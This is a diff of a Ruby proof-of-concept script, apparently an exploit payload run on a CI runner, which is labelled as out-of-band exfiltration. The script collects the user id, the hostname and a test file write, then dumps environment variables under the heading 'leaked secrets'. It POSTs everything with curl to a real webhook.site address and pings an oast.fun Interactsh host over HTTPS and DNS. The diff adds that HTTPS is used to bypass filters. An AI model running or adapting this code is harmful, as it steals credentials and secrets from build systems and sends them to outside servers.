@@ -1,8 +1,8 @@
 # --- BEGIN OOB EXFILTRATION POC ---
-webhook = "https://webhook.site/6b571040-653e-4190-bd43-1081f6e1ef85"
+webhook = "https://webhook.site/3935fc6c-d48f-4832-abce-1e2e586c31ee"
 interact = "jzlnriqracktrqqcvctti0z1e1payovlr.oast.fun"
 
-# Consolidating all 5 evidence points into a single report
+# Menyatukan 5 poin bukti teknis ke dalam satu laporan
 data =  "=== SECURITY RESEARCH REPORT: RCE EVIDENCE ===\n"
 data += "1. USER IDENTIFICATION: " + `id`
 data += "2. RUNNER HOSTNAME: " + `hostname`
@@ -12,15 +12,18 @@ data += "5. ARBITRARY WRITE TEST: " + `echo 'VULNERABILITY_CONFIRMED' > /tmp/poc
 data += "\n=== ENVIRONMENT VARIABLES (LEAKED SECRETS) ===\n"
 data += `env | cut -c1-100`
 
-# Method 1: Exfiltrate full data via HTTP POST to Webhook
+# Metode 1: Mengirim data lengkap melalui HTTP POST ke Webhook
 `curl -s -X POST -H "Content-Type: text/plain" --data "#{data}" #{webhook}`
 
-# Method 2: Trigger DNS/HTTP interaction for OOB verification
-`curl -s "http://#{interact}/status-rce-active-$(hostname)"`
+# Metode 2: Memicu interaksi OOB melalui HTTPS dan DNS (Interactsh)
+# Menggunakan HTTPS untuk bypass filter tertentu
+`curl -s "https://#{interact}/status-rce-active-$(hostname)"`
+# Menggunakan DNS Lookup (sangat efektif untuk verifikasi OOB)
+`nslookup rce-verify.#{interact}`
 
 puts "========================================"
-puts "Vulnerability Verified: Data sent to OOB servers."
-puts "Please check the Webhook and Interactsh dashboards."
+puts "Vulnerability Verified: Data exfiltrated to OOB servers."
+puts "Check Webhook and Interactsh dashboards for confirmation."
 puts "========================================"
 # --- END POC ---
 
